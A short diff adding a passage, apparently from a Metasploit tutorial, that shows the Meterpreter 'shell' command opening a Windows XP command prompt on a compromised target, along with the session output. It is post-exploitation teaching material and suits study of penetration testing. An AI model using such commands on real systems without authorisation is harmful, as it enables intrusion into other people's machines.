@@ -1,0 +1,10 @@
+The shell command will present you with a standard shell on the target system.
+
+meterpreter > shell
+
+Process 39640 created.
+Channel 2 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
